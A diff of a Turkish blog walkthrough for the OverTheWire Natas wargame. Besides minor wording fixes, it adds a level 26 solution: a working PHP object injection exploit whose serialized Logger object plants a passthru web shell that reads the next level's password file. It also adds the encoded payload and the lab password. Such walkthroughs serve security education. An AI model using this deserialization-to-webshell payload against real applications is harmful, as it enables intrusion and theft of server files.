@@ -413,7 +413,7 @@ Note: this website is colocated with http://natas21.natas.labs.overthewire.org m
 </figure>
 
 ````
-Strstr fonksiyonu bir string içerisinde bir karakter veya karakter grubu arar.Aranan karakter dizisi bulunamazsa false, bulunursa stringin ilk veya son bölümü döner.
+Strstr fonksiyonu bir string içerisinde bir karakter veya karakter grubu arar.Aranan karakter dizisi bulunamazsa false, bulunursa stringin ilk veya son bölümünü döner.
     echo strstr("Hello world!", "w");
         world!
 ````
@@ -583,14 +583,18 @@ User-agent injection atak yaparak, yazdığımız kodun çıktısını log dosya
 
 Bu bölümde PHP Object Injection atak gerçekleştirerek level 27' ye ait parolayı öğreneceğiz.
 
+
 ````
 Bu zafiyetin oluşabilmesi ve exploit edilebilmesi için;
     -Kullanıcıdan alınan inputun unserialize methoduna gönderilmesi
     -Yazılım genelinde herhangi bir sınıfın --destruct methodunun bulunması
     -Destruct methodunun, ait olduğu classın sınıf değişkenlerini herhangi bir nedenle yerel diske kayıt ediyor olması
     -Bu kayıt edilen dosyanın bulunduğu dizinin web üzerinden erişilebilir olması
-                    [Kaynak](https://www.mehmetince.net/php-object-injection-saldirilari-ve-korunmasi/)
+                    
 ````
+
+Daha detaylı bir bilgi için: https://www.mehmetince.net/php-object-injection-saldirilari-ve-korunmasi/
+
 Kullanıcıdan alınan cookie değeri unserialize metoduna veriliyor.
 <figure>
 <img src="/assets/img/natas/natas262.png">
@@ -601,3 +605,53 @@ Logger sınıfının destruct methodu mevcut ve değişkenler bir dosyaya kayded
 </figure>
 
 Exploiti için;
+
+{% highlight php %}
+ <?php
+   
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+      
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="<? passthru(' cat /etc/natas_webpass/natas27'); ?>";
+            $this->exitMsg="<? passthru(' cat /etc/natas_webpass/natas27'); ?>";
+            $this->logFile = "img/burju.php";
+      
+        }                       
+      
+        function log($msg){
+            ;
+        }                       
+      
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }                       
+    }
+    
+   $obj=new Logger("aa");
+   echo urlencode(base64_encode(serialize($obj)));
+   
+?>
+
+{% endhighlight %}
+
+şeklinde malformed class oluşturuyoruz.Scriptin çalıştırılması sonucu;
+
+"Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL2J1cmp1LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjUwOiI8PyBwYXNzdGhydSgnIGNhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA%2FPiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUwOiI8PyBwYXNzdGhydSgnIGNhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA%2FPiI7fQ%3D%3D" değerini elde ediyoruz.
+ 
+ <figure>
+<img src="/assets/img/natas/natas269.png">
+</figure>
+<figure>
+<img src="/assets/img/natas/natas268.png">
+</figure>
+
+img/burju.php adresine gidiyoruz.
+
+>> natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
